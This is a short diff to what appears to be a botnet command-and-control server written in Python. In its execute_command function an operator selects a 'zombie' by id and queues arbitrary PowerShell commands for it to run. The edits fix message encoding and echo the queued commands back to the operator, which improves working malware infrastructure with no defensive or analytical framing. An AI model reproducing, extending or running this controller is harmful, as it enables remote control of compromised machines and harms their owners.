@@ -21,13 +21,13 @@ def execute_command(socket):
 	socket.send(b'Please choose a zombie to command by specifying his id: ')
 	choice = int(socket.recv(2048).decode('utf-8'))
 	z = listener.zombies[choice]
-	socket.send('Zombie with uuid: '+z.uuid+' is selected.'.encode())
+	socket.send(('Zombie with uuid: '+z.uuid+' is selected.\n').encode())
 	socket.send(b'Please enter powershell command to execute: ')
 	command = socket.recv(2048).decode('utf-8')
 	z.command_cue.append(command)
-	socket.send(('The following commands are cued for zombie '+z.uuid).encode())
+	socket.send(('The following commands are cued for zombie '+z.uuid+'\n').encode())
 	for command in z.command_cue:
-		print(command)
+		socket.send((command).encode())
 
 def close_socket(socket):
 	socket.close()
